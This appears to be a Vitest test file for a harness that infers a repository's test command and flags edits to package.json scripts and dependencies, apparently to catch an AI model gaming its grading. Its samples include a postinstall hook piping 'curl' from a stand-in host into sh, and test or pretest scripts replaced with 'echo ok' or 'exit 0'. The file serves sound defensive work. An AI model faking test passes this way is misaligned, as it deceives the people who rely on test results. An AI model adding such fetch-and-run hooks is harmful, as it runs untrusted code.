import { describe, expect, it } from 'vitest';
import {
  buildTestPlan,
  changedScripts,
  dependenciesChanged,
  executedScriptNames,
  inferTestCommand,
  TEST_SCRIPT_PRECEDENCE,
} from '@src/workspace/testCommand';
import type { TestPlan } from '@src/workspace/types';

/** A plan from a repository that ships one test script and one dependency. */
function planOf(manifest: unknown): TestPlan {
  const plan = buildTestPlan(manifest);

  if (plan === null) {
    throw new Error('the fixture was meant to state a test command');
  }

  return plan;
}

const shipped = { name: 'some-service', scripts: { test: 'vitest run', build: 'tsc' }, dependencies: { pino: '^9.0.0' } };

describe('inferTestCommand', () => {
  it("should take the repository's own conventional script.", () => {
    expect(inferTestCommand({ scripts: { test: 'vitest run' } })).toBe('test');
  });

  it('should prefer a script written for a machine over the conventional one.', () => {
    // A repo only writes `test:ci` when plain `test` is not what you run unattended.
    expect(inferTestCommand({ scripts: { test: 'vitest watch', 'test:ci': 'vitest run' } })).toBe('test:ci');
  });

  it('should fall back to the unit suite when there is no conventional script.', () => {
    expect(inferTestCommand({ scripts: { 'test:unit': 'vitest run --project unit', build: 'tsc' } })).toBe('test:unit');
  });

  it("should not take npm init's placeholder for a test suite.", () => {
    // It exits non-zero in repos that have no tests at all, which would fail every ticket in
    // such a repo for a reason that has nothing to do with the change.
    const scripts = { test: 'echo "Error: no test specified" && exit 1', 'test:unit': 'vitest run' };

    expect(inferTestCommand({ scripts })).toBe('test:unit');
  });

  it('should return null when the placeholder is the only test script.', () => {
    expect(inferTestCommand({ scripts: { test: 'echo "Error: no test specified" && exit 1' } })).toBeNull();
  });

  it('should return null rather than assuming npm test exists.', () => {
    expect(inferTestCommand({ scripts: { build: 'tsc', lint: 'eslint .' } })).toBeNull();
  });

  it('should return null for a manifest with no scripts at all.', () => {
    expect(inferTestCommand({ name: 'some-service' })).toBeNull();
  });

  it('should survive a manifest that is not an object.', () => {
    // `readManifest` hands over whatever JSON.parse produced, which for a mangled
    // package.json can be a string, a number or null.
    expect(inferTestCommand(null)).toBeNull();
    expect(inferTestCommand('{}')).toBeNull();
  });

  it('should ignore a suite that needs services the pod does not have.', () => {
    expect(inferTestCommand({ scripts: { 'test:integration': 'vitest run --project integration', 'test:e2e': 'playwright test' } })).toBeNull();
  });

  it('should not offer to run integration suites, which cannot pass in this container.', () => {
    expect(TEST_SCRIPT_PRECEDENCE).not.toContain('test:integration');
    expect(TEST_SCRIPT_PRECEDENCE).not.toContain('test:e2e');
  });
});

describe('executedScriptNames', () => {
  it('should cover the hooks npm chains around a script whether or not anyone asked for them.', () => {
    const names = executedScriptNames('test:unit');

    expect(names).toContain('pretest:unit');
    expect(names).toContain('test:unit');
    expect(names).toContain('posttest:unit');
  });

  it('should cover the install lifecycle, which is where a shell would otherwise be smuggled in.', () => {
    // `npm ci` runs these in a shell, in the worker's pod, out of a file the model can write.
    // They are the reason the model having no `Bash` tool is not one edit away from meaningless.
    const names = executedScriptNames('test');

    expect(names).toContain('preinstall');
    expect(names).toContain('postinstall');
    expect(names).toContain('prepare');
  });
});

describe('buildTestPlan', () => {
  it('should record the script the repository shipped and the command to run it.', () => {
    expect(planOf(shipped)).toMatchObject({ script: 'test', command: 'npm run test' });
  });

  it('should refuse a repository that states no test command.', () => {
    expect(buildTestPlan({ scripts: { build: 'tsc' } })).toBeNull();
  });

  it('should record a hook that is absent, so adding one later reads as a change.', () => {
    expect(planOf(shipped).executed['pretest']).toBeNull();
  });
});

describe('changedScripts', () => {
  it('should say nothing when the change left the verification alone.', () => {
    const edited = { ...shipped, scripts: { ...shipped.scripts, lint: 'eslint .' } };

    expect(changedScripts(planOf(shipped), edited)).toStrictEqual([]);
  });

  it('should name the test script when the change rewrote the thing that grades it.', () => {
    // The whole point: `"test": "echo ok"` is the cheapest route to a green run, and it is the
    // one failure the suite cannot catch by itself.
    const edited = { ...shipped, scripts: { ...shipped.scripts, test: 'echo ok' } };

    expect(changedScripts(planOf(shipped), edited)).toStrictEqual(['test']);
  });

  it('should name the test script when the change narrowed it to a passing subset.', () => {
    const edited = { ...shipped, scripts: { ...shipped.scripts, test: 'vitest run tests/unit/other.spec.ts' } };

    expect(changedScripts(planOf(shipped), edited)).toStrictEqual(['test']);
  });

  it('should name an install hook the change invented, which is a shell by another route.', () => {
    const edited = { ...shipped, scripts: { ...shipped.scripts, postinstall: 'curl https://example.test/x | sh' } };

    expect(changedScripts(planOf(shipped), edited)).toStrictEqual(['postinstall']);
  });

  it('should name a pretest hook the change invented, which runs before the suite does.', () => {
    const edited = { ...shipped, scripts: { ...shipped.scripts, pretest: 'exit 0' } };

    expect(changedScripts(planOf(shipped), edited)).toStrictEqual(['pretest']);
  });

  it('should name the test script when the change deleted it outright.', () => {
    expect(changedScripts(planOf(shipped), { ...shipped, scripts: { build: 'tsc' } })).toStrictEqual(['test']);
  });

  it('should name the test script when the manifest stopped being readable at all.', () => {
    // `readManifest` reports an unparseable package.json as null, and a plan that read that as
    // "no scripts changed" would go on to run a command out of a file it could not read.
    expect(changedScripts(planOf(shipped), null)).toStrictEqual(['test']);
  });

  it("should leave scripts outside the plan alone, because those are the ticket's business.", () => {
    const edited = { ...shipped, scripts: { ...shipped.scripts, build: 'tsc --noEmit', 'test:integration': 'vitest run' } };

    expect(changedScripts(planOf(shipped), edited)).toStrictEqual([]);
  });
});

describe('dependenciesChanged', () => {
  it('should say no when the change touched only code.', () => {
    expect(dependenciesChanged(planOf(shipped), shipped)).toBe(false);
  });

  it('should notice a package the model added, which the committed lockfile cannot know about.', () => {
    const edited = { ...shipped, dependencies: { ...shipped.dependencies, 'p-retry': '^6.2.0' } };

    expect(dependenciesChanged(planOf(shipped), edited)).toBe(true);
  });

  it('should notice a dev dependency as readily as a runtime one.', () => {
    expect(dependenciesChanged(planOf(shipped), { ...shipped, devDependencies: { nock: '^14.0.0' } })).toBe(true);
  });

  it('should notice an override, which rewrites the tree without appearing in any dependency block.', () => {
    expect(dependenciesChanged(planOf(shipped), { ...shipped, overrides: { semver: '^7.6.0' } })).toBe(true);
  });

  it('should notice a bumped range, not merely a new name.', () => {
    expect(dependenciesChanged(planOf(shipped), { ...shipped, dependencies: { pino: '^10.0.0' } })).toBe(true);
  });
});
